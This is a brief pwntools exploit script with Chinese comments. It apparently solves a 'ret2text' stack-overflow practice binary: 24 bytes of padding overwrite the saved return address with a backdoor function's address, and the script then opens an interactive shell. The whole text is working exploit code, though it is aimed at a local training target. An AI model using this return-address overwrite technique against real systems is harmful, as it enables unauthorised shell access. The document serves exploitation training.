from pwn import *
context(arch='amd64',os='linux',log_level='debug')

p=process('./ret2text')

# 由gdb获取backdoor的地址:0x1169
backdoor_addr=0x1169

payload=b'A'*24     # 字符串+rbp的大小 16B+8B
payload+=p64(backdoor_addr)     # 将返回地址篡改成后门函数地址，那么将打开shell

# 等待输出换行时，发送payload
p.sendlineafter(b'\n',payload)

p.interactive()     # 收获成果，获取交互式shell